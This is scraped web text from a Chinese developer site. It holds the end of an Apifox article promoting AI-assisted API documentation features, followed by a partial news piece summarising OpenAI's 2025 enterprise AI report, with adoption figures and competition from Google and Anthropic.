<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/93af005643b642679a6b9204b15cf068~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQXBpZm94:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941286&amp;x-signature=qj542t0iQ0X4Qk%2FcduFRc4qFzY0%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-1">AI 帮你完善细节</h2>
<p>导入基本信息后，接下来就是完善细节了。</p>
<p>如果你拿捏不准一个字段的命名，可以使用「<a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.apifox.com%2Ffield-naming" target="_blank" title="https://docs.apifox.com/field-naming" ref="nofollow noopener noreferrer">AI 命名</a>」功能。AI 会结合接口上下文和接口设计规范，给出更准确的命名建议。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/adfda69e5795441eba5d795104ec4a70~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQXBpZm94:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941286&amp;x-signature=PGkCYyqm51BH66hzrnuTX2OxYxw%3D" alt="" loading="lazy"/></p>
<p>字段描述或中文名称也可以交给 AI 来补全，自动生成更清晰、完整的说明。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f610a613ffe74ec79d2a6b1081b00df0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQXBpZm94:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941286&amp;x-signature=GaLJ%2F7Ym9574VFY1ilEvODyUIVI%3D" alt="" loading="lazy"/></p>
<p>Mock 数据的填充也是 AI 的强项。很多时候我们知道字段的含义，但不知道应该提供什么样的示例值。AI 会根据字段类型和描述，自动生成合理的示例数据。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1d5ca93165034b16817dc6220f8a5925~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQXBpZm94:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941286&amp;x-signature=qHT3H%2F2Lsug1nkP%2BjTR09xEBSM4%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-2">完整性检查避免遗漏</h2>
<p>文档完善得差不多时，心里往往还是会有些不确定，可能会觉得有没有关键的信息还没补全？这时候就可以用 Apifox 的「<a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.apifox.com%2Fapi-docs-completeness-check" target="_blank" title="https://docs.apifox.com/api-docs-completeness-check" ref="nofollow noopener noreferrer">接口文档完整性检测</a>」功能，来检查文档中是否存在遗漏的地方。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7b4b5d6fdd3b4ba1bf3978bd5d518412~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQXBpZm94:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941286&amp;x-signature=sD0aPFi73vXnN5kgNKselHjXO4c%3D" alt="" loading="lazy"/></p>
<p>AI 会扫描你当前接口的接口文档，从多个角度检查可能的遗漏。检测完成后，会生成一份详细的报告，接口文档的每个检测内容都会进行打分。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7c9364ed4df247cbac9d8887c7b83ecf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQXBpZm94:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941286&amp;x-signature=SgZFYnAGh1xLp7sGnowL3jpP33k%3D" alt="" loading="lazy"/></p>
<p>报告里不只是建议你做什么，还会给出为什么这么做的原因。比如你写了成功响应的格式，但没有描述可能的错误情况；你提供了基本的字段说明，但缺少使用限制或格式要求。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/553776d4972f485db42cf0a30791f19f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQXBpZm94:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941286&amp;x-signature=Ex5%2FfZNn5IcML31zspLLaIi9ySM%3D" alt="" loading="lazy"/></p>
<p>你可以根据报告里的建议来完善接口文档。</p>
<h2 data-id="heading-3">规范性检查保证一致性</h2>
<p>除了完整性之外，接口文档的规范性同样重要。同一个接口中，命名风格应该统一，字段类型定义要准确，响应结构要合理，这些细节对文档的可读性和可维护性影响很大。</p>
<p>Apifox 的「<a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.apifox.com%2Fapi-compliance-check" target="_blank" title="https://docs.apifox.com/api-compliance-check" ref="nofollow noopener noreferrer">接口规范性检测</a>」会从多个维度审查你的接口文档。它会检查命名是否一致，如果有些字段用了动词，有些用了名词，AI 会建议统一使用其中一种风格。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/088cdb03785a4465bcfec156c6ae3ebb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQXBpZm94:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941286&amp;x-signature=E5MVJYrWax8bDxvs7ku0QbpQrpw%3D" alt="" loading="lazy"/></p>
<p>它也会检查字段定义的规范性，例如字段命名是否混用了大小写风格、是否同时出现下划线和驼峰、是否存在不一致的缩写方式等等，并给出相应的调整建议。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/656ea3bced2442829bd77a689e92f014~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQXBpZm94:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941286&amp;x-signature=Z1qJsxDDUj9nKSaj%2BBf6ck3WGMQ%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-4">总结</h2>
<p>完善以及规范接口文档是非常重要的，「<a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.apifox.com%2Fgenerate-test-cases" target="_blank" title="https://docs.apifox.com/generate-test-cases" ref="nofollow noopener noreferrer">AI 生成测试用例</a>」也依赖接口文档的信息，文档越完整、越规范，AI 生成的用例就会越准确、越丰富。</p>
<p>你不需要一次性把所有 AI 功能都用上，也不需要完全改变现有的工作习惯。</p>
<p>整个过程是渐进式的。你可以从导入现有文档开始，然后逐步使用 AI 功能来完善和优化。当你对某个建议不确定时，可以先保持原样，等有更多上下文信息时再决定是否采纳。</p>
<p>随着使用次数的增加，你会发现自己对接口文档规范的理解在不断加深。AI 的建议不只是帮你解决当前的问题，更重要的是在潜移默化中培养更好的文档编写习惯</p>
<p>以上的这几个 Apifox 的 AI 功能，本质上是降低了写规范文档的门槛。它让你在不增加太多工作量的前提下，得到更高质量的文档。每次使用 AI 功能，都是在学习更好的文档编写方法，所以，快去用起来吧！</p>
<p>可以前往 <a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.apifox.com%2Fhelp" target="_blank" title="https://docs.apifox.com/help" ref="nofollow noopener noreferrer">Apifox 帮助文档</a>，查看更多功能说明和操作指南。如有任何问题，欢迎在 <a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.apifox.com%2Fdoc-5751209%23%25E7%2594%25A8%25E6%2588%25B7%25E7%25BE%25A4%2F" target="_blank" title="https://docs.apifox.com/doc-5751209#%E7%94%A8%E6%88%B7%E7%BE%A4/" ref="nofollow noopener noreferrer">Apifox 用户群</a>与我们交流沟通。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[OpenAI最新报告曝光！前5%精英效率暴涨16倍，普通人却被悄悄淘汰]]></title>    <link>https://juejin.cn/post/7581760987763032115</link>    <guid>https://juejin.cn/post/7581760987763032115</guid>    <pubDate>2025-12-10T03:10:12.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581760987763032115" data-draft-id="7581760987762999347" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="OpenAI最新报告曝光！前5%精英效率暴涨16倍，普通人却被悄悄淘汰"/> <meta itemprop="keywords" content="人工智能,OpenAI"/> <meta itemprop="datePublished" content="2025-12-10T03:10:12.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="新智元"/> <meta itemprop="url" content="https://juejin.cn/user/952600743642312"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            OpenAI最新报告曝光！前5%精英效率暴涨16倍，普通人却被悄悄淘汰
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/952600743642312/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    新智元
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T03:10:12.000Z" title="Wed Dec 10 2025 03:10:12 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读11分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fa91ebf0cc8745af98921bd73f5885c9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941011&amp;x-signature=wcUi5C5iVRZl5P1iiL1f6HGM4qM%3D" alt="" loading="lazy"/></p>
<h5 data-id="heading-0"><strong>「【新智元导读】当你还在纠结要不要用一下 AI 时，OpenAI 已经拎着 8 亿人的加班数据，在被谷歌和 Anthropic 逼到墙角的企业战场上拼命自救——到底是谁在每天白赚 1 小时，谁又在被时代悄悄淘汰？」</strong></h5>
<p>奥特曼紧急拉响「红色警报」后，OpenAI 对外放话：</p>
<p>我们，在企业级市场赢了。</p>
<p>最新数据显示，过去一年，企业用户对 OpenAI 工具的使用量猛增。</p>
<p>自 2024 年 11 月以来，ChatGPT 在企业场景的消息量，<strong>「增长了 8 倍」</strong>。企业数据反馈：员工**「每天平均能省下近 1 小时工作时间」**。</p>
<p>第三方数据也在佐证这一点。</p>
<p>Ramp AIIndex 统计：<strong>「美国接近 36% 的企业已成为 ChatGPT Enterprise 客户」</strong>，Anthropic 的占比为 14.3%。</p>
<p>基于 **「8 亿周活跃用户」**和 **「9000 名企业员工」**的数据分析，OpenAI 在最新《企业 AI 现状报告》中得出一个结论：</p>
<p>企业 AI 采用率不只在上升，而是在 加速、加深 。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c5c5ada4d4f04a57bcb79ded1a7abb64~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941011&amp;x-signature=m%2B4yPq0eQq%2FeqR1PVztMUU6t6II%3D" alt="" loading="lazy"/></p>
<p>完整报告：<a href="https://link.juejin.cn?target=https%3A%2F%2Fcdn.openai.com%2Fpdf%2F7ef17d82-96bf-4dd1-9df2-228f7f377a29%2Fthe-state-of-enterprise-ai_2025-report.pdf" target="_blank" title="https://cdn.openai.com/pdf/7ef17d82-96bf-4dd1-9df2-228f7f377a29/the-state-of-enterprise-ai_2025-report.pdf" ref="nofollow noopener noreferrer">cdn.openai.com/pdf/7ef17d8…</a></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7f614cfb5c924ea0b6cf964f1d48ef55~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941011&amp;x-signature=t6%2Fa2q14NWm39xREZh4fg8rdtbQ%3D" alt="" loading="lazy"/></p>
<p><strong>「增长焦虑」</strong></p>
<p><strong>「</strong>「OpenAI」** 艰难自救」**</p>
<p>留给 OpenAI 的时间不多了，市场非常残酷。</p>
<p>在消费者市场，OpenAI 的好日子结束了：</p>
<ul>
<li>在综合问题解决能力上，很多评测都认为：<strong>「谷歌 Gemini 反超了 ChatGPT」</strong>；</li>
<li>在图像生成领域，新模型 Nano Banana Pro 的表现，也已远超 DALL·E；</li>
<li>目前，OpenAI 的大部分收入，仍来自个人订阅，而这一块正被 Gemini 步步蚕食。</li>
</ul>
<p>与此同时，OpenAI 还要应对多条战线的夹击：</p>
<ul>
<li>对手 Anthropic 在企业市场快速扩张；</li>
<li>越来越多面向企业的「开源权重」（open-weight）模型，把价格打到极低；</li>
<li>商业模式被持续质疑，烧钱速度和债务水平不断抬升，压力开始传导给合作伙伴和生态。</li>
</ul>
<p>虽然 ChatGPT 依然占据整体主导地位，但 Gemini 增速非常凶；Claude、DeepSeek 等后起之秀正在补课追赶。</p>
<p>外部传言也很直白：<strong>「为了应对 Gemini 的猛攻，OpenAI 正在准备提前发布 ChatGPT 新模型。」</strong></p>
<p>但问题已经不止是模型强不强。<strong>「谁能真正拿下企业市场，才是下一阶段胜负手。」</strong></p>
<p><strong>「<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a4f4310a22a84f7d9c674794089b00e9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941011&amp;x-signature=JCyeO1mYwOtQxkMDlo9MI0CJ1i4%3D" alt="" loading="lazy"/>」</strong></p>
<p><strong>「谷歌和 Anthropic 同时出击，OpenAI 腹背受敌」</strong></p>
<p>本月初，SEO 和分析公司 FirstPageSage 发布了最新 AI 市场份额报告。</p>
<p>一个趋势特别醒目：<strong>「谷歌 Gemini 正快速逼近第二名，季度</strong>「<strong>「增长速度」</strong>」<strong>几乎是在「狂奔超车」。」</strong></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b6cb9d48abcb490396e20f0940c40410~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941011&amp;x-signature=ve%2FKwHtZwyJzptrc64HOu2oLeE8%3D" alt="" loading="lazy"/></p>
<p>在企业 AI 市场，OpenAI 颓势早已浮现。</p>
<p>根据 Ramp AI 指数，2025 年 10 月企业 AI 采用率上升了 0.9 个百分点，达到 44.8%。</p>
<p>OpenAI 仍是企业付费 AI 服务的绝对老大，但**增长开始踩刹车：**企业采用率只涨了 <strong>「0.3 个百分点」</strong>，低于今年 8 月创下的高点。</p>
<p><strong>「而 Anthropic 成为那个月里增长最快的玩家」</strong>：企业用户比例上涨 <strong>「2.1 个百分点」</strong>，达到 <strong>「14.3%」</strong>，创其历史第二高月增幅，仅次于今年 3 月那次暴涨 3.6 个百分点。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2202bcd7b4664958b78524ce42082f7e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941011&amp;x-signature=rdL5k4cRKzUZFXqtTm4HEHnafMY%3D" alt="" loading="lazy"/></p>
<p><strong>「11 月 5 日，</strong>「OpenAI 宣布，全球已有超过 **「100 万家企业客户」**正在直接使用其 AI 服务，成为」<strong>史上增长最快的商业平台」</strong>。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/28efd3cf2c2e44dbb25ad098829256fb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941011&amp;x-signature=MFbkp4CcnuOGGp1T3ZWhR%2B8mn%2BY%3D" alt="" loading="lazy"/></p>
<p>OpenAI 的企业用户中不乏一些知名企业，如安进（Amgen）、澳大利亚联邦银行、Booking.com、思科（Cisco）、Lowe’s、摩根士丹利、T-Mobile、Target 和赛默飞</p>
<p>几乎与此同时，OpenAI 放出一个更大的数字：<strong>「未来几年，计划投入高达 1.4 万亿美元建设算力和基础设施。」</strong></p>
<p>这句话的潜台词很清晰：要撑起这笔钱，<strong>「企业客户的增长，已经是 OpenAI 商业模式的关键支点。」</strong></p>
<p>OpenAI 首席经济学家 Ronnie Chatterji 对企业 AI 感到激动：</p>
<p>过去几年，AI 最直观的影响几乎都集中在消费端。</p>
<p>但真正让我感到兴奋的，是如今企业内部正在发生的变化。</p>
<p>在这样的背景下，OpenAI 发布了《企业 AI 现状报告》，公布其在企业 AI 上真正的实力。</p>
<p><strong>「<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/088c69a3acbd4bdfa69e73491e93bb4d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941011&amp;x-signature=hBRfb6bqiDf8XAsbOfYR1ApJlXM%3D" alt="" loading="lazy"/>」</strong></p>
<p><strong>「企业 AI：风口已来」</strong></p>
<p>报告先以史为鉴，从蒸汽机到半导体，历史一再证明：</p>
<p>真正释放经济价值的时刻，不在技术刚被发明的那几年，而是在企业把这些底层能力规模化应用之后 。</p>
<p>企业 AI 正在走向这一步。</p>
<p>这一次，企业级 AI 看起来已进入一个关键拐点：<strong>「从试水期，走进深水区。」</strong></p>
<p>这份报告主要回答了三个问题：</p>
<ol>
<li>企业到底在用 AI 做什么？</li>
<li>这些应用，真的在创造价值吗？</li>
<li>头部领跑者，到底比普通企业多做了什么？</li>
</ol>
<p>OpenAI 首席财务官 Sarah Friar 用几组核心数据，给出了清晰图谱。</p>
<p>⏱️**效率飞跃：**员工利用 AI 工作每天平均节省 <strong>「40–60 分钟」</strong>；重度用户每周节省时间超过 <strong>「10 小时」</strong>。</p>
<p>🔁**流程重塑：**结构化 AI 工作流今年增长了 <strong>「19 倍」</strong>。这标志着企业已明显从「实验试水」转向了「可重复、嵌入式」的标准流程。</p>
<p>🧠**深度智能：**过去 12 个月，每家企业的推理 Token（Reasoning Token）使用量增长了约 <strong>「320 倍」</strong>。这意味着更深层的智能已被整合进产品与决策中，而不仅仅是多发了几条「提示词」（prompt）。</p>
<p>🚀**「能力破圈：75%」** 的员工表示能够完成以前无法胜任的任务。AI 正在拓展人类的能力边界，而不仅仅是提升速度。</p>
<p>💻**全员开发：**非技术岗位员工的代码类应用增长了 <strong>「36%」</strong>。「想法」与「执行」之间的鸿沟正在迅速消失。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0065677154fe4b5ebfec60364861a9a6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941011&amp;x-signature=y8kx%2BE0MJW%2BNnvKMwgEbVTtjcxY%3D" alt="" loading="lazy"/></p>
<p>尤其值得关注的是，非技术岗位的编程相关互动增加了 36%，普通员工正借助 AI 突破技能瓶颈。</p>
<p>然而，数据也预警了「贫富差距」的扩大：前 5% 的深度用户在使用频率和深度上远超中位数用户。</p>
<p>这表明，组织和个人的 AI 准备度将成为未来竞争的关键分水岭。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/54b8728e47a143f0b08dfc540d45d62d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941011&amp;x-signature=XIuZRFuKfdJn8xM6%2F%2BW3UV%2FLIMM%3D" alt="" loading="lazy"/></p>
<p><strong>「报告细节」</strong></p>
<p>报告的结论基于两类核心数据源：</p>
<ul>
<li>**实际使用数据：**来自 OpenAI 企业客户的去标识化（de-identified）和聚合（aggregated）的使用数据。</li>
<li>**调查数据：**针对近 100 家企业的 9,000 名员工进行的关于 AI 采用模式的调查。</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5078bf6a75d24162bdd2b3e8fe503d48~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941011&amp;x-signature=wzET9Letwh3CciJbHyk0ENCeZW0%3D" alt="" loading="lazy"/></p>
<p>分析过程中没有任何 OpenAI 员工查阅具体的企业、业务或 API 客户数据，仅使用自动化分类系统处理消息内容。</p>
<p>换句话说，这不是「拍脑袋体感」，而是**「真实使用行为 + 大样本调研」**叠加出来的结果。</p>
<h3 data-id="heading-1">企业使用加速与深度集成</h3>
<p>OpenAI 目前拥有超过 **「700 万」**个 ChatGPT 工作席位，企业版席位同比增长约 <strong>「9 倍」</strong>。</p>
<p>自 2024 年 11 月以来，企业周消息量增长约 <strong>「8 倍」</strong>。定制化工具使用率飙升，CustomGPTs 和 Projects 的周用户数增长了 <strong>「19 倍」</strong>，目前约 <strong>「20%」</strong> 的企业消息是通过这些定制工具处理的，显示工作流正被数据化和标准化。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/59490990497344e6a4d3599a6c866f4e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941011&amp;x-signature=c5R1Lx7Ibt1UK093djBYNB0EWdQ%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-2">API 与开发者工作流</h3>
<p>API 消费量巨大：超过 <strong>「9,000」</strong> 个组织处理了超过 **「100 亿」**个 Token，近 <strong>「200」</strong> 个组织处理量超过 <strong>「1 万亿」</strong>。</p>
<p>推理 Token 消耗量在过去 12 个月中增长了 <strong>「320 倍」</strong>，表明更智能的模型正在被集成。</p>
<p>Codex（代码模型）的周活跃用户增长了 <strong>「2 倍」</strong>，显示代码生成数据的增加。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5c3132dd28fc48f0a4b4067eb38a63b9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941011&amp;x-signature=lxAZ91%2FTz1yR2hgKYitHfX6gGpo%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-3">员工价值与生产力数据</h3>
<p>调查数据显示，<strong>「75%」</strong> 的员工报告提高了速度或质量。</p>
<p>数据科学（Data Science）岗位的员工平均每天节省 <strong>「60-80 分钟」</strong>，高于平均水平。</p>
<p>值得注意的是，非技术岗位（非工程、IT、研究）的**「编程相关消息量」**增长了 <strong>「36%」</strong>，表明更多普通员工开始处理技术数据。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d2cdc037ec4e402d89850207f28461b3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941011&amp;x-signature=0ql0eK2H3mw8YgogL4dLEEIoITM%3D" alt="" loading="lazy"/></p>
